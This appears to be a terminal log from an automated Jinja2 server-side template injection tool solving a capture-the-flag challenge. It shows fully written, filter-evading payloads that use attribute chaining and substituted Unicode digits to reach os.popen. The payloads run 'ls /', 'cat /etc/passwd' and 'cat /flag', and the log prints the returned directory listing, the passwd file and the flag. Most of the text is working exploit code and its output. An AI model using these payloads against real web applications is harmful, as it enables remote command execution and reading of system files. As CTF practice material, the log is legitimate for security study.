+INFO:[cli] | Submit payload {%set jm=dict(OS=x)|first|lower%}{%set po=dict(POPEN=x)|first|lower%}{%set by=dict(BYTES=x)|first|lower%}{%set de=dict(DECODE=x)|first|lower%}{%set re=dict(READ=x)|first|lower%}{%set ndll={}|select()|trim|list|batch(25)|first|last%}{%set gl=dict(GLOBALS=x)|first|lower%}{%set go=(ndll,ndll,gl,ndll,ndll)|join%}{%set ge=dict(GETITEM=x)|first|lower%}{%set gi=(ndll,ndll,ge,ndll,ndll)|join%}{%set bu=dict(BUILTINS=x)|first|lower%}{%set bi=(ndll,ndll,bu,ndll,ndll)|join%}{%set im=dict(IMPORT=x)|first|lower%}{%set ip=(ndll,ndll,im,ndll,ndll)|join%}{{lipsum|attr(go)|attr(gi)(bi)|attr(gi)(ip)(jm)|attr(po)(lipsum|attr(go)|attr(gi)(bi)|attr(gi)(by)((1٠٨,115,32,4٧),)|attr(de)(),)|attr(re)()}}
+
+        klf不会连这都绕不过去吧～
+        你好！afs
+bin
+boot
+dev
+etc
+flag
+home
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+
+
+$>> cat /etc/passwd
+INFO:[full_payload_gen] | Start generating final expression...
+INFO:[payload_gen] | Great, integer(99) can be 9٩
+INFO:[payload_gen] | Great, integer(101) can be 1٠١
+INFO:[payload_gen] | Great, integer(100) can be 1٠٠
+INFO:[payload_gen] | Great, string('cat /etc/passwd') can be lipsum|attr(go)|attr(gi)(bi)|attr(gi)(by)((9٩,97,116,32,4٧,1٠١,116,9٩,4٧,112,97,115,115,119,1٠٠),)|attr(de)()
+INFO:[payload_gen] | Great, we generate os_popen_obj('cat /etc/passwd')
+INFO:[payload_gen] | Great, we generate os_popen_read('cat /etc/passwd')
+INFO:[cli] | Submit payload {%set jm=dict(OS=x)|first|lower%}{%set po=dict(POPEN=x)|first|lower%}{%set by=dict(BYTES=x)|first|lower%}{%set de=dict(DECODE=x)|first|lower%}{%set re=dict(READ=x)|first|lower%}{%set ndll={}|select()|trim|list|batch(25)|first|last%}{%set gl=dict(GLOBALS=x)|first|lower%}{%set go=(ndll,ndll,gl,ndll,ndll)|join%}{%set ge=dict(GETITEM=x)|first|lower%}{%set gi=(ndll,ndll,ge,ndll,ndll)|join%}{%set bu=dict(BUILTINS=x)|first|lower%}{%set bi=(ndll,ndll,bu,ndll,ndll)|join%}{%set im=dict(IMPORT=x)|first|lower%}{%set ip=(ndll,ndll,im,ndll,ndll)|join%}{{lipsum|attr(go)|attr(gi)(bi)|attr(gi)(ip)(jm)|attr(po)(lipsum|attr(go)|attr(gi)(bi)|attr(gi)(by)((9٩,97,116,32,4٧,1٠١,116,9٩,4٧,112,97,115,115,119,1٠٠),)|attr(de)(),)|attr(re)()}}
+
+        klf不会连这都绕不过去吧～
+        你好！root:x:0:0:Super User:/root:/bin/bash
+bin:x:1:1:bin:/bin:/usr/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/usr/sbin/nologin
+adm:x:3:4:adm:/var/adm:/usr/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/usr/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/usr/sbin/nologin
+operator:x:11:0:operator:/root:/usr/sbin/nologin
+games:x:12:100:games:/usr/games:/usr/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/usr/sbin/nologin
+nobody:x:65534:65534:Kernel Overflow User:/:/usr/sbin/nologin
+dbus:x:81:81:System Message Bus:/:/usr/sbin/nologin
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+tss:x:59:59:Account used for TPM access:/:/usr/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin
+systemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin
+systemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin
+qemu:x:107:107:qemu user:/:/sbin/nologin
+polkitd:x:998:997:User for polkitd:/:/sbin/nologin
+avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
+geoclue:x:997:996:User for geoclue:/var/lib/geoclue:/sbin/nologin
+nm-openconnect:x:996:995:NetworkManager user for OpenConnect:/:/sbin/nologin
+colord:x:995:994:User for colord:/var/lib/colord:/sbin/nologin
+usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin
+gluster:x:994:993:GlusterFS daemons:/run/gluster:/sbin/nologin
+rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
+pipewire:x:993:992:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin
+chrony:x:992:990:chrony system user:/var/lib/chrony:/sbin/nologin
+dnsmasq:x:991:989:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/usr/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+saslauth:x:990:76:Saslauthd user:/run/saslauthd:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+openvpn:x:989:988:OpenVPN:/etc/openvpn:/sbin/nologin
+nm-openvpn:x:988:987:Default user for running openvpn spawned by NetworkManager:/:/sbin/nologin
+unbound:x:987:986:Unbound DNS resolver:/var/lib/unbound:/sbin/nologin
+abrt:x:173:173::/etc/abrt:/sbin/nologin
+flatpak:x:986:984:Flatpak system helper:/:/usr/sbin/nologin
+gdm:x:42:42:GNOME Display Manager:/var/lib/gdm:/usr/sbin/nologin
+gnome-initial-setup:x:985:983::/run/gnome-initial-setup/:/sbin/nologin
+vboxadd:x:984:1::/var/run/vboxadd:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/usr/sbin/nologin
+tcpdump:x:72:72:tcpdump:/:/usr/sbin/nologin
+systemd-coredump:x:978:978:systemd Core Dumper:/:/usr/sbin/nologin
+systemd-timesync:x:977:977:systemd Time Synchronization:/:/usr/sbin/nologin
+cube:x:1000:1000:cube:/home/cube:/usr/bin/zsh
+clash:x:976:976::/home/clash:/bin/bash
+akmods:x:975:975:User is used by akmods to build akmod packages:/var/cache/akmods/:/sbin/nologin
+caddy:x:974:970:Caddy web server:/var/lib/caddy:/sbin/nologin
+nginx:x:973:969:Nginx web server:/var/lib/nginx:/sbin/nologin
+
+
+$>> cat /flag
+INFO:[full_payload_gen] | Start generating final expression...
+INFO:[payload_gen] | Great, integer(102) can be 1٠٢
+INFO:[payload_gen] | Great, integer(103) can be 1٠٣
+INFO:[payload_gen] | Great, string('cat /flag') can be lipsum|attr(go)|attr(gi)(bi)|attr(gi)(by)((9٩,97,116,32,4٧,1٠٢,1٠٨,97,1٠٣),)|attr(de)()
+INFO:[payload_gen] | Great, we generate os_popen_obj('cat /flag')
+INFO:[payload_gen] | Great, we generate os_popen_read('cat /flag')
+INFO:[cli] | Submit payload {%set jm=dict(OS=x)|first|lower%}{%set po=dict(POPEN=x)|first|lower%}{%set by=dict(BYTES=x)|first|lower%}{%set de=dict(DECODE=x)|first|lower%}{%set re=dict(READ=x)|first|lower%}{%set ndll={}|select()|trim|list|batch(25)|first|last%}{%set gl=dict(GLOBALS=x)|first|lower%}{%set go=(ndll,ndll,gl,ndll,ndll)|join%}{%set ge=dict(GETITEM=x)|first|lower%}{%set gi=(ndll,ndll,ge,ndll,ndll)|join%}{%set bu=dict(BUILTINS=x)|first|lower%}{%set bi=(ndll,ndll,bu,ndll,ndll)|join%}{%set im=dict(IMPORT=x)|first|lower%}{%set ip=(ndll,ndll,im,ndll,ndll)|join%}{{lipsum|attr(go)|attr(gi)(bi)|attr(gi)(ip)(jm)|attr(po)(lipsum|attr(go)|attr(gi)(bi)|attr(gi)(by)((9٩,97,116,32,4٧,1٠٢,1٠٨,97,1٠٣),)|attr(de)(),)|attr(re)()}}
+
+        klf不会连这都绕不过去吧～
+        你好！FLAG{SUCCESS!Y0U_M4DE_1T!}
+
+       win.html
+$>>
+Bye!
+➜  Fenjing git:(dev) ✗
